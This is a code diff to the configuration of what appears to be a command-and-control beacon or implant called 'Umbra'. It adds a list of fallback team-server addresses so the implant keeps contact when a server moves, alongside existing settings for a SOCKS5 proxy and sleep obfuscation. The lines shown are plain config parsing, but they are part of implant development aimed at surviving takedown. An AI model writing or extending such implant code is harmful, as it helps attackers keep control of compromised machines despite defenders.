@@ -54,6 +54,10 @@ pub const COMPILED_WS_HOST_HEADER: &str = match option_env!("UMBRA_WS_HOST_HEADE
     Some(v) => v,
     None => "",
 };
+pub const COMPILED_SERVERS: &str = match option_env!("UMBRA_SERVERS") {
+    Some(v) => v,
+    None => "",
+};
 pub const COMPILED_PROXY: &str = match option_env!("UMBRA_PROXY") {
     Some(v) => v,
     None => "",
@@ -103,6 +107,11 @@ pub struct Config {
     pub http_pad: u32,
     /// The SOCKS5 proxy the beacon dials through (empty = direct).
     pub proxy: String,
+    /// The fallback addresses of the team server.
+    ///
+    /// When the first address is down, the beacon tries the next one, so a
+    /// server that moves does not take the implant with it.
+    pub servers: Vec<String>,
     /// Whether the beacon obfuscates its sleep interval (on by default).
     pub sleep_obfuscate: bool,
 }
@@ -201,6 +210,11 @@ impl Config {
                 .parse::<u32>()
                 .map_err(|_| "UMBRA_HTTP_PAD must be an integer".to_string())?,
             proxy: pick("UMBRA_PROXY", COMPILED_PROXY),
+            servers: pick("UMBRA_SERVERS", COMPILED_SERVERS)
+                .split(',')
+                .map(|s| s.trim().to_string())
+                .filter(|s| !s.is_empty())
+                .collect(),
             sleep_obfuscate: env::var("UMBRA_SLEEP_OBFUSCATE")
                 .map(|v| v != "0" && v.to_lowercase() != "false")
                 .unwrap_or(true),
